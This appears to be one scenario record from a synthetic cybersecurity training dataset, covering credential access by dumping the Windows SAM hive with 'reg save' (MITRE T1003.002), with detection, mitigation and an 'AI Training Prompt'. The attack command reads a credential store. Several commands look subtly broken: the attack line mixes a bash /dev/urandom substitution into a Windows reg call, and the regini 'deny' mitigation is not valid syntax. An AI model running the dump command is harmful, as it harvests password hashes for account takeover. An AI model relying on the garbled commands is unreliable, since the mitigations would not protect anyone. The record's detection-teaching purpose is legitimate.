---
type: campaign
scenario_id: 37
tactic: Credential Access
technique: "T1003.002: Security Account Manager"
technique_id: T1003.002
tags: [campaign, lotl, credential_access]
---

# Dumping SAM database using reg save for credential access.

## Threat Description
Dumping SAM database using reg save for credential access.

## Attack Command
```
reg save HKLM\SAM $(echo sam$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).hiv)
```

## Detection Logic
Monitor reg save: `wmic process where name='reg.exe' get commandline | findstr SAM`; Event ID 4663.

## Mitigation
Restrict SAM access: `regini -h deny HKLM\SAM`; Enable LSA protection: `reg add HKLM\System\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1`.

## AI Training Prompt
Train AI to detect SAM database dumping and suggest LSA protections.

## References
- MITRE ATT&CK T1003.002: https://attack.mitre.org/techniques/T1003/002/
- CWE-522: https://cwe.mitre.org/data/definitions/522.html
